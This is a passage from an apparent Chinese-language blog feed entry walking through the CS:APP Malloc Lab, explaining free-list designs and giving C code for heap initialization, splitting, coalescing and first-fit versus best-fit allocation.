    
    
    <tags>
      
      <tag>computer</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>csapp malloc_lab</title>
    <link href="/2024/01/31/csapp-malloc-lab/"/>
    <url>/2024/01/31/csapp-malloc-lab/</url>
    
    <content type="html"><![CDATA[<h1 id="Malloc-Lab"><a href="#Malloc-Lab" class="headerlink" title="Malloc Lab"></a>Malloc Lab</h1><p>Writing a Dynamic Storage Allocator动态存储分配器</p><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>In this lab you will be writing a dynamic storage allocator for C programs, i.e., your own version of the malloc, free and realloc routines. You are encouraged to explore the design space creatively and implement an allocator that is correct, efficient and fast.</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>动态内存分配器维护着一个进程的<strong>虚拟内存</strong>区域，称为堆。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202402021821863.png" alt="堆的示例"></p><p>分配器将堆视为一组大小不同的块的集合来维护，且它们的地址是连续的。将块标记为两种，已分配的块供应用程序使用，空闲块用来分配，</p><p>如何组织这些块，课本提供了三种实现方式</p><h3 id="Implicit-Free-List"><a href="#Implicit-Free-List" class="headerlink" title="Implicit Free List"></a>Implicit Free List</h3><p>把所有的块连接起来，每次分配的时从头到尾扫描合适的空闲块</p><h3 id="Explicit-Free-List"><a href="#Explicit-Free-List" class="headerlink" title="Explicit Free List"></a>Explicit Free List</h3><p>是Implicit Free List的进一步优化，每个链表中的块有大致相等的大小，分配器维护着一个空闲链表数组，每个大小类一个空闲链表，但需要分配块时只需要在对应的空闲链表中搜索就好，书中有两种分离存储的方式。</p><h4 id="Simple-Segregated-Storage"><a href="#Simple-Segregated-Storage" class="headerlink" title="Simple Segregated Storage"></a>Simple Segregated Storage</h4><p>从不合并与分离，每个块的大小就是大小类中最大元素的大小。例如大小类为 {17~32}，则需要分配块的大小在这个区间时均在此对应链表进行分配，并且都是分配大小为 32 的块。这样做，显然分配和释放都是常数级的，但是空间利用率较低</p><h4 id="Segregated-Fit"><a href="#Segregated-Fit" class="headerlink" title="Segregated Fit"></a>Segregated Fit</h4><p>每个大小类的空闲链表包含大小不同的块，分配完一个块后，将这个块进行分割，并根据剩下的块的大小将其插入到适当大小类的空闲链表中。这个做法平衡了搜索时间与空间利用率，C 标准库提供的 GNU malloc 包就是采用的这种方法。</p><h2 id="Implicit-Free-List实现"><a href="#Implicit-Free-List实现" class="headerlink" title="Implicit Free List实现"></a>Implicit Free List实现</h2><p>立即边界合并方式实现</p><p>要想分数尽可能高，我们需要使吞吐率尽可能高，空间利用率尽可能小，如果从不重复利用任何块，函数的吞吐率会非常好，而空间利用率会很差；而若进行空闲块的分割合并等操作又会影响吞吐率，因而，就要设计合适的数据结构与算法来平衡两者的关系。</p><ul><li>空闲块组织：利用隐式空闲链表记录空闲块</li><li>放置策略：如何选择合适的空闲块分配？<ul><li>首次适配：从头开始搜索空闲链表，选择第一个合适的空闲块</li><li>下一次适配：从上一次查询结束的地方开始搜索选择第一个合适的空闲块</li><li>最佳适配：搜索能放下请求大小的最小空闲块</li></ul></li><li>分割：在将一个新分配的块放置到某个空闲块后，剩余的部分要进行处理</li><li>合并：释放某个块后，要让它与相邻的空闲块合并</li></ul><h3 id="空闲块组织："><a href="#空闲块组织：" class="headerlink" title="空闲块组织："></a>空闲块组织：</h3><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202402021845325.png" alt="空闲块组织结构"></p><ul><li>脚部与头部是相同的，均为 4 个字节，用来存储块的大小，以及表明这个块是已分配还是空闲块</li><li>由于要求块双字对齐，所以块大小就总是 8 的倍数，低 3 位总是为 0，因而，我们只需要利用头部和脚部的高 29 位存储块的大小，剩下 3 位的最低位来指明这个块是否空闲，000 为空闲，001 为已分配</li></ul><p>为什么既设置头部又设置尾部呢？这是为了能够以常数时间来进行块的合并。无论是与下一块还是与上一块合并，都可以通过他们的头部或尾部得知块大小，从而定位整个块，避免了从头遍历链表。</p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202402021846575.png" alt="组织"></p><p>堆有两个特殊的标记：</p><ul><li>序言块：8 个字节，由一个头部和一个脚部组成</li><li>结尾块：大小为 0 的头部</li></ul><p>为了消除合并空闲块时边界的考虑，将序言块和结尾块的分配位均设置为已分配。为了保证双字对齐，在序言块的前面还设置了 4 个字节作为填充。</p><p>根据上述结构，可以定义一些方便操作的宏：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* 头部/脚部的大小 */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> WSIZE 4</span><br><span class="hljs-comment">/* 双字 */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DSIZE 8</span><br><br><span class="hljs-comment">/* 扩展堆时的默认大小 */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CHUNKSIZE (1 &lt;&lt; 12)</span><br><br><span class="hljs-comment">/* 设置头部和脚部的值, 块大小+分配位 */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PACK(size, alloc) ((size) | (alloc))</span><br><br><span class="hljs-comment">/* 读写指针p的位置 */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> GET(p) (*(unsigned int *)(p))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PUT(p, val) ((*(unsigned int *)(p)) = (val))</span><br><br><span class="hljs-comment">/* 从头部或脚部获取大小或分配位 */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> GET_SIZE(p) (GET(p) &amp; ~0x7)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> GET_ALLOC(p) (GET(p) &amp; 0x1)</span><br><br><span class="hljs-comment">/* 给定有效载荷指针, 找到头部和脚部 */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> HDRP(bp) ((char*)(bp) - WSIZE)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FTRP(bp) ((char*)(bp) + GET_SIZE(HDRP(bp)) - DSIZE)</span><br><br><span class="hljs-comment">/* 给定有效载荷指针, 找到前一块或下一块 */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NEXT_BLKP(bp) ((char*)(bp) + GET_SIZE(((char*)(bp) - WSIZE)))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PREV_BLKP(bp) ((char*)(bp) - GET_SIZE(((char*)(bp) - DSIZE)))</span><br></code></pre></td></tr></table></figure><h3 id="合并与分割"><a href="#合并与分割" class="headerlink" title="合并与分割"></a>合并与分割</h3><p>先<strong>初始化堆</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * mm_init - initialize the malloc package.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">mm_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">/* 申请四个字节空间 */</span><br>    <span class="hljs-keyword">if</span>((heap_list = mem_sbrk(<span class="hljs-number">4</span>*WSIZE)) == (<span class="hljs-type">void</span> *)<span class="hljs-number">-1</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    PUT(heap_list, <span class="hljs-number">0</span>);                              <span class="hljs-comment">/* 对齐 */</span><br>    <span class="hljs-comment">/* </span><br><span class="hljs-comment">     * 序言块和结尾块均设置为已分配, 方便考虑边界情况</span><br><span class="hljs-comment">     */</span><br>    PUT(heap_list + (<span class="hljs-number">1</span>*WSIZE), PACK(DSIZE, <span class="hljs-number">1</span>));     <span class="hljs-comment">/* 填充序言块 */</span><br>    PUT(heap_list + (<span class="hljs-number">2</span>*WSIZE), PACK(DSIZE, <span class="hljs-number">1</span>));     <span class="hljs-comment">/* 填充序言块 */</span><br>    PUT(heap_list + (<span class="hljs-number">3</span>*WSIZE), PACK(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>));         <span class="hljs-comment">/* 结尾块 */</span><br><br>    heap_list += (<span class="hljs-number">2</span>*WSIZE);<br><br>    <span class="hljs-comment">/* 扩展空闲空间 */</span><br>    <span class="hljs-keyword">if</span>(extend_heap(CHUNKSIZE/WSIZE) == <span class="hljs-literal">NULL</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>重点在于<strong>扩展堆</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 扩展heap, 传入的是字节数</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">void</span> *<span class="hljs-title function_">extend_heap</span><span class="hljs-params">(<span class="hljs-type">size_t</span> words)</span><br>&#123;<br>    <span class="hljs-comment">/* bp总是指向有效载荷 */</span><br>    <span class="hljs-type">char</span> *bp;<br>    <span class="hljs-type">size_t</span> size;<br>    <span class="hljs-comment">/* 根据传入字节数奇偶, 考虑对齐 */</span><br>    size = (words % <span class="hljs-number">2</span>) ? (words+<span class="hljs-number">1</span>) * WSIZE : words * WSIZE;<br><br>    <span class="hljs-comment">/* 分配 */</span><br>    <span class="hljs-keyword">if</span>((<span class="hljs-type">long</span>)(bp = mem_sbrk(size)) == <span class="hljs-number">-1</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-comment">/* 设置头部和脚部 */</span><br>    PUT(HDRP(bp), PACK(size, <span class="hljs-number">0</span>));           <span class="hljs-comment">/* 空闲块头 */</span><br>    PUT(FTRP(bp), PACK(size, <span class="hljs-number">0</span>));           <span class="hljs-comment">/* 空闲块脚 */</span><br>    PUT(HDRP(NEXT_BLKP(bp)), PACK(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>));   <span class="hljs-comment">/* 片的新结尾块 */</span><br><br>    <span class="hljs-comment">/* 判断相邻块是否是空闲块, 进行合并 */</span><br>    <span class="hljs-keyword">return</span> coalesce(bp);<br>&#125;<br></code></pre></td></tr></table></figure><p>扩展堆每次在原始堆的尾部申请空间，<code>mem_sbrk</code>函数返回指向旧堆尾部的指针，因此，可以直接将原始堆的尾部位置设置新空闲块的头部。</p><p>接下来就是 <strong>free</strong>，设置一下头部和脚部即可，free 完后注意合并空闲块</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * mm_free - Freeing a block does nothing.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">mm_free</span><span class="hljs-params">(<span class="hljs-type">void</span> *ptr)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(ptr==<span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span>;<br>    <span class="hljs-type">size_t</span> size = GET_SIZE(HDRP(ptr));<br><br>    PUT(HDRP(ptr), PACK(size, <span class="hljs-number">0</span>));<br>    PUT(FTRP(ptr), PACK(size, <span class="hljs-number">0</span>));<br>    coalesce(ptr);<br>&#125;<br></code></pre></td></tr></table></figure><p>分割空闲块要考虑剩下的空间是否足够放置头部和脚部</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 分离空闲块</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">place</span><span class="hljs-params">(<span class="hljs-type">void</span> *bp, <span class="hljs-type">size_t</span> asize)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> csize = GET_SIZE(HDRP(bp));<br><br>    <span class="hljs-comment">/* 判断是否能够分离空闲块 */</span><br>    <span class="hljs-keyword">if</span>((csize - asize) &gt;= <span class="hljs-number">2</span>*DSIZE) &#123;<br>        PUT(HDRP(bp), PACK(asize, <span class="hljs-number">1</span>));<br>        PUT(FTRP(bp), PACK(asize, <span class="hljs-number">1</span>));<br>        bp = NEXT_BLKP(bp);<br>        PUT(HDRP(bp), PACK(csize - asize, <span class="hljs-number">0</span>));<br>        PUT(FTRP(bp), PACK(csize - asize, <span class="hljs-number">0</span>));<br>    &#125;<br>    <span class="hljs-comment">/* 设置为填充 */</span><br>    <span class="hljs-keyword">else</span>&#123;<br>        PUT(HDRP(bp), PACK(csize, <span class="hljs-number">1</span>));<br>        PUT(FTRP(bp), PACK(csize, <span class="hljs-number">1</span>));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>合并</strong>需要考虑四种情况进行处理：</p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202402021851915.png" alt="分配的四种情况"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 合并空闲块</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">void</span> *<span class="hljs-title function_">coalesce</span><span class="hljs-params">(<span class="hljs-type">void</span> *bp)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> prev_alloc = GET_ALLOC(FTRP(PREV_BLKP(bp)));     <span class="hljs-comment">/* 前一块大小 */</span><br>    <span class="hljs-type">size_t</span> next_alloc = GET_ALLOC(HDRP(NEXT_BLKP(bp)));     <span class="hljs-comment">/* 后一块大小 */</span><br>    <span class="hljs-type">size_t</span> size = GET_SIZE(HDRP(bp));                       <span class="hljs-comment">/* 当前块大小 */</span><br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 四种情况：前后都不空, 前不空后空, 前空后不空, 前后都空</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-comment">/* 前后都不空 */</span><br>    <span class="hljs-keyword">if</span>(prev_alloc &amp;&amp; next_alloc)&#123;<br>        <span class="hljs-keyword">return</span> bp;<br>    &#125;<br>    <span class="hljs-comment">/* 前不空后空 */</span><br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(prev_alloc &amp;&amp; !next_alloc)&#123;<br>        size += GET_SIZE(HDRP(NEXT_BLKP(bp)));  <span class="hljs-comment">//增加当前块大小</span><br>        PUT(HDRP(bp), PACK(size, <span class="hljs-number">0</span>));           <span class="hljs-comment">//先修改头</span><br>        PUT(FTRP(bp), PACK(size, <span class="hljs-number">0</span>));           <span class="hljs-comment">//根据头部中的大小来定位尾部</span><br>    &#125;<br>    <span class="hljs-comment">/* 前空后不空 */</span><br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(!prev_alloc &amp;&amp; next_alloc)&#123;<br>        size += GET_SIZE(HDRP(PREV_BLKP(bp)));  <span class="hljs-comment">//增加当前块大小</span><br>        PUT(FTRP(bp), PACK(size, <span class="hljs-number">0</span>));<br>        PUT(HDRP(PREV_BLKP(bp)), PACK(size, <span class="hljs-number">0</span>));<br>        bp = PREV_BLKP(bp);                     <span class="hljs-comment">//注意指针要变</span><br>    &#125;<br>    <span class="hljs-comment">/* 都空 */</span><br>    <span class="hljs-keyword">else</span>&#123;<br>        size += GET_SIZE(HDRP(PREV_BLKP(bp))) + GET_SIZE(FTRP(NEXT_BLKP(bp)));  <span class="hljs-comment">//增加当前块大小</span><br>        PUT(FTRP(NEXT_BLKP(bp)), PACK(size, <span class="hljs-number">0</span>));<br>        PUT(HDRP(PREV_BLKP(bp)), PACK(size, <span class="hljs-number">0</span>));<br>        bp = PREV_BLKP(bp);<br>    &#125;<br>    <span class="hljs-keyword">return</span> bp;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="放置策略"><a href="#放置策略" class="headerlink" title="放置策略"></a>放置策略</h3><p><strong>首次适配</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-title function_">find_fit</span><span class="hljs-params">(<span class="hljs-type">size_t</span> asize)</span><br>&#123;<br>    <span class="hljs-type">void</span> *bp;<br>    <span class="hljs-keyword">for</span>(bp = heap_list; GET_SIZE(HDRP(bp)) &gt; <span class="hljs-number">0</span>; bp = NEXT_BLKP(bp))&#123;<br>        <span class="hljs-keyword">if</span>((GET_SIZE(HDRP(bp)) &gt;= asize) &amp;&amp; (!GET_ALLOC(HDRP(bp))))&#123;<br>            <span class="hljs-keyword">return</span> bp;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>最佳适配</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-title function_">best_fit</span><span class="hljs-params">(<span class="hljs-type">size_t</span> asize)</span>&#123;<br>    <span class="hljs-type">void</span> *bp;<br>    <span class="hljs-type">void</span> *best_bp = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">size_t</span> min_size = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(bp = heap_list; GET_SIZE(HDRP(bp)) &gt; <span class="hljs-number">0</span>; bp = NEXT_BLKP(bp))&#123;<br>        <span class="hljs-keyword">if</span>((GET_SIZE(HDRP(bp)) &gt;= asize) &amp;&amp; (!GET_ALLOC(HDRP(bp))))&#123;<br>            <span class="hljs-keyword">if</span>(min_size ==<span class="hljs-number">0</span> || min_size &gt; GET_SIZE(HDRP(bp)))&#123;<br>                min_size = GET_SIZE(HDRP(bp));<br>                best_bp = bp;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> best_bp;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分配块</strong></p><p>最后就是主体部分 mm_malloc 函数，对申请的空间大小按 8 对齐进行舍入，然后根据放置策略查找有无合适的空闲块，如果没有则申请扩展堆</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-title function_">mm_malloc</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> asize;<br>    <span class="hljs-type">size_t</span> extendsize;<br>    <span class="hljs-type">char</span> *bp;<br>    <span class="hljs-keyword">if</span>(size == <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">if</span>(size &lt;= DSIZE)<br>        asize = <span class="hljs-number">2</span>*DSIZE;<br>    <span class="hljs-keyword">else</span><br>        asize = DSIZE * ((size + (DSIZE) + (DSIZE<span class="hljs-number">-1</span>)) / DSIZE);<br>    <span class="hljs-comment">/* 寻找合适的空闲块 */</span><br>    <span class="hljs-keyword">if</span>((bp = best_fit(asize)) != <span class="hljs-literal">NULL</span>)&#123;<br>        place(bp, asize);<br>        <span class="hljs-keyword">return</span> bp;<br>    &#125;<br>    <span class="hljs-comment">/* 找不到则扩展堆 */</span><br>    extendsize = MAX(asize, CHUNKSIZE);<br>    <span class="hljs-keyword">if</span>((bp = extend_heap(extendsize/WSIZE)) == <span class="hljs-literal">NULL</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    place(bp, asize);<br>    <span class="hljs-keyword">return</span> bp;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="结果与分数"><a href="#结果与分数" class="headerlink" title="结果与分数"></a>结果与分数</h3><p>使用最佳适配</p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202402021908368.png" alt="best_fit"></p><p>使用首次适配</p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202402021908380.png" alt="使用find_fit"></p><p>最佳适配的分数反而变低了，原因是虽然空间利用率提高了，但是时间增加太多了。</p><h2 id="Segregated-Free-Lists实现"><a href="#Segregated-Free-Lists实现" class="headerlink" title="Segregated Free Lists实现"></a>Segregated Free Lists实现</h2><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202402021914240.png" alt="空闲块结构"></p><p>每个块都有一个头部和脚部，在有效载荷中又分别存放着指向前一个块和后一个块的指针。所以每一个空闲块最小为16字节。</p><p>堆的结构也在原来的结构上进行改进</p><p>相当于在原来的堆结构中增加了两点：</p><ul><li>堆结构的前面放置不同等价类空闲块的头指针</li><li>每个空闲块的有效载荷分出一部分作为前驱和后继指针</li></ul><p>也就是说，我们的这个做法与 Implicit Free List 非常相似，只不过多维护了 n 个链表</p><p>根据链表的结构特点，增加了几个操作宏：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* 读写指针p的位置 */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> GET(p) (*(unsigned int *)(p))</span><br><span class="hljs-comment">/* 给定序号，找到链表头节点位置 */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> GET_HEAD(num) ((unsigned int *)(long)(GET(heap_list + WSIZE * num)))</span><br><span class="hljs-comment">/* 给定bp,找到前驱和后继 */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> GET_PRE(bp) ((unsigned int *)(long)(GET(bp)))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> GET_SUC(bp) ((unsigned int *)(long)(GET((unsigned int *)bp + 1)))</span><br></code></pre></td></tr></table></figure><h3 id="大小类设置"><a href="#大小类设置" class="headerlink" title="大小类设置"></a>大小类设置</h3><p>由上述结构，每个空闲块最小也要 16 个字节，理论上来说，设置的大小类越多，时间性能要越好，因而设置 20 个大小类：</p><p>${16},{17-32},{33-64},…,{2049-4096},{4097-9194},…,{2^{22}+1-\infty}$</p><h3 id="结构建立"><a href="#结构建立" class="headerlink" title="结构建立"></a>结构建立</h3><p>先看初始化函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">mm_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">/* 申请四个字节空间 */</span><br>    <span class="hljs-keyword">if</span>((heap_list = mem_sbrk((<span class="hljs-number">4</span>+CLASS_SIZE)*WSIZE)) == (<span class="hljs-type">void</span> *)<span class="hljs-number">-1</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    <span class="hljs-comment">/* 初始化20个大小类头指针 */</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; CLASS_SIZE; i++)&#123;<br>        PUT(heap_list + i*WSIZE, <span class="hljs-literal">NULL</span>);<br>    &#125;<br>    <span class="hljs-comment">/* 对齐 */</span><br>    PUT(heap_list + CLASS_SIZE * WSIZE, <span class="hljs-number">0</span>);<br>    <span class="hljs-comment">/* </span><br><span class="hljs-comment">     * 序言块和结尾块均设置为已分配, 方便考虑边界情况</span><br><span class="hljs-comment">     */</span><br>    PUT(heap_list + ((<span class="hljs-number">1</span> + CLASS_SIZE)*WSIZE), PACK(DSIZE, <span class="hljs-number">1</span>));     <span class="hljs-comment">/* 填充序言块 */</span><br>    PUT(heap_list + ((<span class="hljs-number">2</span> + CLASS_SIZE)*WSIZE), PACK(DSIZE, <span class="hljs-number">1</span>));     <span class="hljs-comment">/* 填充序言块 */</span><br>    PUT(heap_list + ((<span class="hljs-number">3</span> + CLASS_SIZE)*WSIZE), PACK(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>));         <span class="hljs-comment">/* 结尾块 */</span><br><br><br>    <span class="hljs-comment">/* 扩展空闲空间 */</span><br>    <span class="hljs-keyword">if</span>(extend_heap(CHUNKSIZE/WSIZE) == <span class="hljs-literal">NULL</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>在序言块之前放置 20 个空闲链表头指针，剩下的结构与原来完全一样。而扩展堆是在结尾块后进行扩展，因而扩展块操作也与原来相同</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 扩展heap, 传入的是字节数</span><br><span class="hljs-comment">*/</span><br><span 